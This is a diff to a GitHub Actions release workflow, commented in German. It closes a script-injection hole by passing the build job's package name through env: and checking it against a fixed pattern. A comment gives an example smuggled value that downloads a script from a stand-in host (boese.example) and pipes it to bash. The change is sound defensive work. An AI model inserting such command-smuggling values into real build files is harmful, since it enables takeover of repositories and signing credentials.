@@ -77,14 +77,49 @@ jobs:
         with:
           name: linux-paket
           path: aus
+      # DER NAME DES PAKETS KOMMT AUS DEM BAU-AUFTRAG, ALSO AUS EINER QUELLE,
+      # DIE FREMDER CODE BESTIMMEN KANN.
+      #
+      # `bauen` hat nur Leserechte, genau deshalb ist es ein eigener Auftrag
+      # (siehe Kopfkommentar). Fremder Code darin — pub-Pakete und ihre
+      # Build-Hooks, CMake-Skripte der Plugins, apt-Pakete — kann aber die
+      # pubspec.yaml im Arbeitsverzeichnis umschreiben, bevor der Schritt
+      # „Paket schnueren“ die Fassung daraus liest. Zum Beispiel
+      # `version: 1.9.1$(curl -sSfL boese.example -o x;bash x)+21`.
+      #
+      # In `bauen` bleibt das harmlos, weil "$PAKET" von der Shell nicht
+      # erneut ausgewertet wird. Steht der Wert aber als `${{ }}` im Skript
+      # DIESES Auftrags, setzt Actions ihn WOERTLICH in den Text ein, bevor
+      # die Shell ihn sieht — und die fuehrt `$(…)` dann aus. In einem
+      # Auftrag mit `contents: write` und `id-token: write` heisst das:
+      # Release-Dateien ersetzen, auf main pushen, Sigstore-Beglaubigungen
+      # unter dem Namen dieses Workflows ausstellen. Aus „das Linux-Paket ist
+      # manipuliert“ wuerde „das Repo ist manipulierbar“.
+      #
+      # Deshalb: der Wert geht ueber `env:` hinein (dann ist er eine
+      # Shell-Variable und wird nicht als Text eingesetzt) UND wird gegen ein
+      # festes Muster geprueft, bevor ihn irgendetwas benutzt. Die
+      # Beglaubigung bekommt den geprueften Wert, nicht den rohen.
+      - name: Paketnamen pruefen
+        id: pruefen
+        env:
+          PAKET: ${{ needs.bauen.outputs.paket }}
+        run: |
+          if [[ ! $PAKET =~ ^bitdm-linux-x64-[0-9]+\.[0-9]+\.[0-9]+\.tar\.gz$ ]]; then
+            echo "Unerwarteter Paketname aus dem Bau-Auftrag." >&2
+            exit 1
+          fi
+          echo "paket=$PAKET" >> "$GITHUB_OUTPUT"
       - name: Pruefsumme nachrechnen
         working-directory: aus
-        run: sha256sum -c "${{ needs.bauen.outputs.paket }}.sha256"
+        env:
+          PAKET: ${{ steps.pruefen.outputs.paket }}
+        run: sha256sum -c "$PAKET.sha256"
       - uses: actions/attest-build-provenance@977bb373ede98d70efdf65b84cb5f73e068dcc2a # v3
         with:
-          subject-path: aus/${{ needs.bauen.outputs.paket }}
+          subject-path: aus/${{ steps.pruefen.outputs.paket }}
       - name: An den Release haengen
         env:
           GH_TOKEN: ${{ github.token }}
-          PAKET: ${{ needs.bauen.outputs.paket }}
+          PAKET: ${{ steps.pruefen.outputs.paket }}
         run: gh release upload "${GITHUB_REF_NAME}" "aus/$PAKET" "aus/$PAKET.sha256" -R "$GITHUB_REPOSITORY"
